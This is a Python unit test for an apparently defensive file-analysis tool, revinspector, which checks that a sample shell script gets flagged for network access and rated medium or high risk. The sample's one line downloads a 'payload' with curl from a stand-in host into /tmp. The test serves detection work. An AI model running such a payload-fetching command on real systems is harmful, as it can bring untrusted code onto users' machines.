import tempfile
import unittest
from pathlib import Path

from revinspector.report import analyze_file, to_html, to_json, to_text


class ReportTests(unittest.TestCase):
    def test_analyze_script_report(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            sample = Path(tempdir) / "sample.sh"
            sample.write_text(
                "#!/usr/bin/env sh\n"
                "curl https://example.invalid/payload -o /tmp/payload\n",
                encoding="utf-8",
            )

            report = analyze_file(sample)
            data = report.to_dict()

            self.assertEqual(data["type"], "script")
            self.assertTrue(data["hashes"]["sha256"])
            self.assertIn(data["risk"], {"medium", "high"})
            self.assertIn("network access", {finding["value"] for finding in data["findings"]})
            self.assertIn("Summary:", to_text(report))
            self.assertIn('"type": "script"', to_json(report))
            self.assertIn("<h2>Indicators</h2>", to_html(report))


if __name__ == "__main__":
    unittest.main()
